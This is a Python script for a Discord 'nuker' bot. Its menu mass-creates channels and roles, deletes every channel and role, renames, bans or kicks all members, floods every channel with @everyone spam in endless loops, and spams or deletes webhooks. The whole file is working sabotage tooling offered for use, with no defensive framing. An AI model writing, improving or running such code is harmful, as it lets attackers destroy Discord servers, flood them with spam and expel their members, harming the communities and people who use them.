from colorama import Fore, init, Style
init(convert = True)

import time,os,datetime
import string
import dhooks
from dhooks import Webhook
from random import *
import time
import discord
import asyncio
import webbrowser
from discord.ext import commands
from discord.ext import tasks
from discord.ext.commands import bot
from discord.utils import get
from discord.ext import commands
import requests


intents = discord.Intents.default()
intents.members = True

bottoken = input("[+] Input bot token: ")
idd = guildid = int(input("[+] Input guild id: "))

bot = commands.Bot(command_prefix='!',intents=intents)
bot.remove_command("help")
characters = string.ascii_letters + string.digits

os.system("cls")
os.system("title Skidding...")
menu = f"""
{Fore.RED}

  ██████  ██ ▄█▀ ██▓▓█████▄ ▓█████▄ ▓█████ ▓█████▄     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▒██    ▒  ██▄█▒ ▓██▒▒██▀ ██▌▒██▀ ██▌▓█   ▀ ▒██▀ ██▌    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▓███▄░ ▒██▒░██   █▌░██   █▌▒███   ░██   █▌   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
  ▒   ██▒▓██ █▄ ░██░░▓█▄   ▌░▓█▄   ▌▒▓█  ▄ ░▓█▄   ▌   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒▒██▒ █▄░██░░▒████▓ ░▒████▓ ░▒████▒░▒████▓    ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░▓   ▒▒▓  ▒  ▒▒▓  ▒ ░░ ▒░ ░ ▒▒▓  ▒    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░░ ░▒ ▒░ ▒ ░ ░ ▒  ▒  ░ ▒  ▒  ░ ░  ░ ░ ▒  ▒    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░  ░ ░░ ░  ▒ ░ ░ ░  ░  ░ ░  ░    ░    ░ ░  ░       ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
      ░  ░  ░    ░     ░       ░       ░  ░   ░                ░    ░     ░  ░      ░  ░   ░     
                     ░       ░              ░
                     
{Fore.RED}[1] = Text Channel Creation.
{Fore.WHITE}[2] = Voice Channel Creation.
{Fore.RED}[3] = Category Creation.
{Fore.WHITE}[4] = Role Creation.
{Fore.RED}[5] = Delete All Channels and Categories.
{Fore.WHITE}[6] = Delete All Roles.
{Fore.RED}[7] = Nickname All Members.
{Fore.WHITE}[8] = Ban All Members.
{Fore.RED}[9] = Ping Everyone In Every Channel.
{Fore.WHITE}[10] = Kicks all Members.
{Fore.RED}[11] = Spammer.
{Fore.WHITE}[12] = Get bot token and invite.
{Fore.RED}[13] = Webhook spammer.
{Fore.WHITE}[14] = Webhook deleter."""


@bot.event
async def on_connect():
    abc = bot.user.id
    print(f"{Fore.RED}[!] Connected to bot : {bot.user.name}" )
    os.system(f"title [!] Connected to bot : {bot.user.name}")
	
	
@bot.event
async def on_ready():
    print(f"{Fore.WHITE}[+] Ready with bot : {bot.user.name}" )
    abc = bot.user.id
    os.system(f"title [+] Ready with bot : {bot.user.name}")
    await bot.change_presence(activity=discord.Game('[!] Starting Up [!]'))

    time.sleep(1)
    await bot.change_presence(activity=discord.Game('Idle...'))
    while True:
        os.system("cls")
        option = input(f"{Fore.RED}{menu}\n [>] = ")
        await bot.change_presence(activity=discord.Game('Idle...'))

        if option == "1":
            guild = await bot.fetch_guild(guildid)
            amount = int(input("[!] Number of text channels to make?\n[>] "))
            name = input("[!] Name of channels to make? Type RANDOM for random character names!\n[>] ")
            random = name.upper()
            for i in range (amount):   
                if random == "RANDOM":
                    name =  "".join(choice(characters) for x in range(randint(4, 15)))
                await bot.change_presence(activity=discord.Game('[!] Creating text channels [!]'))
                await guild.create_text_channel(name)
                currentDT = datetime.datetime.now()
                hour = str(currentDT.hour)
                minute = str(currentDT.minute)
                second = str(currentDT.second)
                print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Text Channel Created{Fore.RED} :{Fore.WHITE} {name}")
                os.system(f"title Spam creating text channels - [{i+1}]")
            input(f"{Fore.RED}[  {Fore.WHITE}  +  {Fore.RED} ]{Fore.WHITE} Created All Channels {Fore.RED}:{Fore.WHITE} [{i+1}] ")
            await bot.change_presence(activity=discord.Game('Idle...'))



        elif option == "2":
            guild = await bot.fetch_guild(guildid)
            amount = int(input("[!] Number of voice channels to make?\n[>] "))
            name = input("[!] Name of channels to make? Type RANDOM for random character names!\n[>] ")
            random = name.upper()
            for i in range (amount):  
                if random == "RANDOM":
                    name =  "".join(choice(characters) for x in range(randint(4, 15)))
                await bot.change_presence(activity=discord.Game('[!] Creating voice channels [!]'))                   
                await guild.create_voice_channel(name)
                currentDT = datetime.datetime.now()
                hour = str(currentDT.hour)
                minute = str(currentDT.minute)
                second = str(currentDT.second)
                print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Voice Channel Created{Fore.RED} :{Fore.WHITE} {name}")
                os.system(f"title Spam creating voice channels - [{i+1}]")
            input(f"{Fore.RED}[  {Fore.WHITE}  +  {Fore.RED} ] {Fore.WHITE}Created All Channels {Fore.RED}:{Fore.WHITE} [{i+1}] \n[>] ")
            await bot.change_presence(activity=discord.Game('Idle...'))


        elif option == "3":

            guild = await bot.fetch_guild(guildid)
            amount = int(input("[!] Number of categories to make?\n[>] "))
            name = input("[!] Name of categories to make? Type RANDOM for random character names!\n[>] ")
            random = name.upper()
            for i in range (amount):   
                if random == "RANDOM":
                    name =  "".join(choice(characters) for x in range(randint(4, 15)))
                await bot.change_presence(activity=discord.Game('[!] Creating categories [!]'))
                await guild.create_category(name)
                currentDT = datetime.datetime.now()
                hour = str(currentDT.hour)
                minute = str(currentDT.minute)
                second = str(currentDT.second)
                print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Categories Created{Fore.RED} :{Fore.WHITE} {name}")
                os.system(f"title Spam creating categories - [{i+1}]")
            input(f"{Fore.RED}[  {Fore.WHITE}  +  {Fore.RED} ] {Fore.WHITE}Created All Categories {Fore.RED}:{Fore.WHITE} [{i+1}] \n[>] ")
            await bot.change_presence(activity=discord.Game('Idle...'))


        elif option == "4":
            guild = await bot.fetch_guild(guildid)
            amount = int(input("[!] Number of roles to make?\n[>] "))
            name = input("[!] Name of roles to make? Type RANDOM for random character names!\n[>] ")
            await bot.change_presence(activity=discord.Game('[!] Creating Roles [!]'))
            random = name.upper()
            colorcount = "red"
            for i in range (amount):   
                if random == "RANDOM":
                    name =  "".join(choice(characters) for x in range(randint(4, 15)))
                if colorcount == "red":
                    await guild.create_role(name=name,color=discord.Color.red())
                    colorcount = "red"
                elif colorcount == "red":
                    await guild.create_role(name=name,color=discord.Color.red())
                    colorcount = "red"
                currentDT = datetime.datetime.now()
                hour = str(currentDT.hour)
                minute = str(currentDT.minute)
                second = str(currentDT.second)
                print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Role Created{Fore.RED} :{Fore.WHITE} {name}")
                os.system(f"title Spam creating roles - [{i+1}]")
            input(f"{Fore.RED}[  {Fore.WHITE}  +  {Fore.RED} ] {Fore.WHITE}Created All Roles {Fore.RED}:{Fore.WHITE} [{i+1}] \n[>] ")
            await bot.change_presence(activity=discord.Game('Idle...'))


        elif option == "5":
            count = int(0)
            for guild in bot.guilds:
                if guild.id == idd:
                    for chan in guild.channels:
                        try:
                            currentDT = datetime.datetime.now()
                            hour = str(currentDT.hour)
                            minute = str(currentDT.minute)
                            second = str(currentDT.second)
                            count = count + 1
                            await chan.delete()
                            await bot.change_presence(activity=discord.Game('[!] Deleting all channels [!]'))
                            os.system(f"title Deleting all channels - [{count}]")
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Channel Deleted{Fore.RED} :{Fore.WHITE} {chan.name}")
                        except:
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Error Deleting Channel {Fore.RED} :{Fore.WHITE} {chan.name}")
                    input(f"{Fore.RED}[  {Fore.WHITE}  +  {Fore.RED} ] {Fore.WHITE}Deleted all channels {Fore.RED}:{Fore.WHITE} [{count}] \n[>] ")
            await bot.change_presence(activity=discord.Game('Idle...'))


        elif option == "6":
            count = int(0)
            for guild in bot.guilds:
                if guild.id == idd:
                    for rol in guild.roles:
                        try:
                            currentDT = datetime.datetime.now()
                            hour = str(currentDT.hour)
                            minute = str(currentDT.minute)
                            second = str(currentDT.second)
                            count = count + 1
                            await rol.delete()
                            await bot.change_presence(activity=discord.Game('[!] Deleting all roles [!]'))
                            os.system(f"title Deleting all roles - [{count}]")
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Role Deleted{Fore.RED} :{Fore.WHITE} {rol.name}")
                        except:
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Error Deleting Role {Fore.RED} :{Fore.WHITE} {rol.name}")
                    input(f"{Fore.RED}[  {Fore.WHITE}  +  {Fore.RED} ] {Fore.WHITE}Deleted all Roles {Fore.RED}:{Fore.WHITE} [{count}] \n[>] ")
            await bot.change_presence(activity=discord.Game('Idle...'))


        elif option == "7":
            count = int(0)
            nick = input("[!] Name of nicknames to change? Type RANDOM for random character names!\n[>] ")
            random = nick.upper()   
            for guild in bot.guilds:
                if guild.id == idd:
                    for mem in guild.members:
                        try:
                            if random == "RANDOM":
                                nick =  "".join(choice(characters) for x in range(randint(4, 15)))
                            currentDT = datetime.datetime.now()
                            hour = str(currentDT.hour)
                            minute = str(currentDT.minute)
                            second = str(currentDT.second)
                            count = count + 1
                            await mem.edit(nick=nick)
                            await bot.change_presence(activity=discord.Game('[!] Changing Nicknames [!]'))
                            os.system(f"title Changing All Nicknames - [{count}]")
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Nickname Changed {Fore.RED} :{Fore.WHITE} {mem.name} > {nick}")
                        except:
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Problem Changing Nickname {Fore.RED} :{Fore.WHITE} {mem.name}")
                    input(f"{Fore.RED}[  {Fore.WHITE}  +  {Fore.RED} ] {Fore.WHITE}Changed All Nicknames {Fore.RED}:{Fore.WHITE} [{count}] \n[>] ")
                    await bot.change_presence(activity=discord.Game('Idle...'))    


        elif option == "8":
            count = int(0)
            for guild in bot.guilds:
                if guild.id == idd:
                    for mem in guild.members:
                        try:
                            currentDT = datetime.datetime.now()
                            hour = str(currentDT.hour)
                            minute = str(currentDT.minute)
                            second = str(currentDT.second)
                            count = count + 1
                            await mem.ban()
                            await bot.change_presence(activity=discord.Game('[!] Banning Members [!]'))
                            os.system(f"title Banning Everyone - [{count}]")
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} User Banned: {Fore.RED} :{Fore.WHITE} {mem.name}")
                        except:
                            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Problem Banning {Fore.RED} :{Fore.WHITE} {mem.name}")
                    input(f"{Fore.RED}[  {Fore.WHITE}  +  {Fore.RED} ] {Fore.WHITE}Finished Banning... {Fore.RED}:{Fore.WHITE} [{count}] \n[>] ")
                    await bot.change_presence(activity=discord.Game('Idle...'))


        elif option == "9":
            count = int(0)
            messageee = input("After the @everyone, what should I say?\n[>] ")
            for guild in bot.guilds:
                if guild.id == idd:
                    while True:
                        for chan in guild.channels:
                            try:
                                currentDT = datetime.datetime.now()
                                hour = str(currentDT.hour)
                                minute = str(currentDT.minute)
                                second = str(currentDT.second)
                                count = count + 1
                                await chan.send(f"@everyone {messageee}")
                                await bot.change_presence(activity=discord.Game('[!] Spamming [!]'))
                                os.system(f"title Messages Sent : [{count}]")
                                time.sleep(0.25)
                                print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Sent [@everyone {messageee}] in{Fore.RED} :{Fore.WHITE} {chan.name}")
                            except:
                                print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Error Messaging Channel {Fore.RED} :{Fore.WHITE} {chan.name}")
                                await bot.change_presence(activity=discord.Game('Idle...'))


        elif option == "10":
            count = int(0)
            for guild in bot.guilds:
                if guild.id == idd:
                    while True:
                        for member in guild.members:
                            try:
                                currentDT = datetime.datetime.now()
                                hour = str(currentDT.hour)
                                minute = str(currentDT.minute)
                                second = str(currentDT.second)
                                count = count + 1
                                await member.kick()
                                await bot.change_presence(activity=discord.Game('[!] Kicking Members [!]'))
                                print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Kicked {member}.")
                            except:
                                    print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Unable to kick {member} you likely dont have permission.")
                                    pass
                                    await bot.change_presence(activity=discord.Game('Idle...'))


        elif option == "11":
            count = int(0)
            messageee = input("Input the message to spam:\n[>] ")
            for guild in bot.guilds:
                if guild.id == idd:
                    while True:
                        for chan in guild.channels:
                            try:
                                currentDT = datetime.datetime.now()
                                hour = str(currentDT.hour)
                                minute = str(currentDT.minute)
                                second = str(currentDT.second)
                                count = count + 1
                                await chan.send(f"{messageee}")
                                await bot.change_presence(activity=discord.Game('[!] Spamming [!]'))
                                os.system(f"title Messages Sent : [{count}]")
                                time.sleep(0.1)
                                print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Sent [{messageee}] in{Fore.RED} :{Fore.WHITE} {chan.name}")
                            except:
                                print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Error Messaging Channel {Fore.RED} :{Fore.WHITE} {chan.name}")
                                await bot.change_presence(activity=discord.Game('Idle...'))



        elif option == "12":
            count = int(0)
            print(f"[!] Invite: https://discord.com/api/oauth2/authorize?client_id={abc}&permissions=8&scope=bot")
            print(f"[!] Bot token: {bottoken}")
            input(f"[>]") 


        elif option == "13":
            count = int(0)
            currentDT = datetime.datetime.now()
            hour = str(currentDT.hour)
            minute = str(currentDT.minute)
            second = str(currentDT.second)
            msg = input(f"[!] Input message to spam:\n [>] ")
            webhookurl = Webhook(input(f"[!] Input webhook:\n [>] "))
            delay = int(input(f"[!] Input delay between messages:\n [>] "))
            await bot.change_presence(activity=discord.Game('[!] Spamming Webhook [!]'))
            while True:
                time.sleep(delay)
                webhookurl.send(msg)
                print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Message sent to webhook.")
            await bot.change_presence(activity=discord.Game('Idle...'))


        elif option == "14":
            count = int(0)
            currentDT = datetime.datetime.now()
            hour = str(currentDT.hour)
            minute = str(currentDT.minute)
            second = str(currentDT.second)
            hook = Webhook(input(f'[!] Input webhook for detetion:\n [>] '))
            await bot.change_presence(activity=discord.Game('[!] Deleting Webhook [!]'))
            hook.delete()
            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.WHITE} Deleted webhook.")
            time.sleep(3)
            await bot.change_presence(activity=discord.Game('Idle...'))

        else:
            print(f"{Fore.RED}[  {Fore.WHITE}  -  {Fore.RED} ] {Fore.WHITE} Invalid Input {Fore.RED}:{Fore.WHITE} {option} ")
            time.sleep(3)

bot.run(bottoken)
